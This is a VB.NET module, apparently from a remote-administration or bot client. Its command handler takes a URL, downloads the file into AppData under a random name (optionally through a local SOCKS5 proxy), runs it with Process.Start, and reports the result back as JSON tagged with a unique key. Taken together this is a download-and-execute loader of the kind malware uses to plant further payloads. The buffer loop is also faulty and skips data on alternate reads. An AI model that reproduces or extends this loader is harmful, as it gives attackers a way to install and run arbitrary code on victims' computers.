﻿Imports System.IO
Imports System.Net
Imports System.Threading
Imports com.LandonKey.SocksWebProxy
Imports Newtonsoft.Json

Module ExecuteCommand
    Public Function Handler(ByVal model As ExecuteModel)
        Try
            Dim r As Random = New Random
            Dim newlocation As String = GetAppdata() & "\" & r.Next(0, 99999) & model.newExecute.Name
            Dim result As LogModel
            If Not IO.File.Exists(newlocation) Then
                If Not model.newExecute.Proxy Then
                    Dim download As WebClient = New WebClient()
                    download.DownloadFile(model.newExecute.Url, newlocation)
                Else
                    DownLoadFileByWebRequest(model.newExecute.Url, newlocation)
                End If
                Thread.Sleep(SectoMs(5))
                If model.newExecute.Run Then
                    result = Running(newlocation, model)
                Else
                    result = New LogModel With {
                            .Message = "File successfully Download!",
                            .Type = "Success",
                            .KeyUnique = GetConfigJson().KeyUnique
                            }
                End If

                Return JsonConvert.SerializeObject(result)
            End If
            result = New LogModel With {
                .Message = "File already exist please try again!",
                .Type = "Error",
                .KeyUnique = GetConfigJson().KeyUnique
            }
            Return JsonConvert.SerializeObject(result)
        Catch ex As Exception
            Dim result As New LogModel With {
                .Message = ex.ToString,
                .Type = "Error",
                .KeyUnique = GetConfigJson().KeyUnique
                }
            Return JsonConvert.SerializeObject(result)
        End Try
    End Function
    Public Function Running(ByVal path As String, ByVal model As ExecuteModel) As LogModel
        Try
            If File.Exists(path) Then
                Process.Start(path)
                Return New LogModel With {
                            .Message = "File successfully executed!",
                            .Type = "Success",
                            .KeyUnique = GetConfigJson().KeyUnique
                            }
            Else
                Return New LogModel With {
                            .Message = "File Not found execute unsuccesfully!",
                            .Type = "Error",
                            .KeyUnique = GetConfigJson().KeyUnique
                            }
            End If

        Catch ex As Exception
            Return New LogModel With {
                .Message = ex.ToString,
                .Type = "Error",
                .KeyUnique = GetConfigJson().KeyUnique
                }
        End Try
    End Function
    Private Sub DownLoadFileByWebRequest(ByVal urlAddress As String, ByVal filePath As String)
        Try
            Dim request As Net.HttpWebRequest = Nothing
            Dim response As Net.HttpWebResponse = Nothing
            Dim socket5 As com.LandonKey.SocksWebProxy.Proxy.ProxyConfig = New com.LandonKey.SocksWebProxy.Proxy.ProxyConfig(IPAddress.Loopback, 8181, IPAddress.Loopback, Config.Variables.SocketPort, com.LandonKey.SocksWebProxy.Proxy.ProxyConfig.SocksVersion.Five)
            request = CType(WebRequest.Create(urlAddress), HttpWebRequest)
            request.Proxy = New SocksWebProxy(socket5)
            request.Timeout = 30000
            request.Method = "GET"
            request.KeepAlive = True
            response = CType(request.GetResponse(), Net.HttpWebResponse)
            Dim s As Stream = response.GetResponseStream()

            If File.Exists(filePath) Then
                File.Delete(filePath)
            End If

            Dim os As FileStream = New FileStream(filePath, FileMode.OpenOrCreate, FileAccess.Write)
            Dim buff As Byte() = New Byte(102399) {}
            Dim c As Integer = 0

            While (s.Read(buff, 0, 10400) > 0)
                c = s.Read(buff, 0, 10400)
                os.Write(buff, 0, c)
                os.Flush()
            End While

            os.Close()
            s.Close()
        Catch
            Return
        Finally
        End Try
    End Sub
End Module
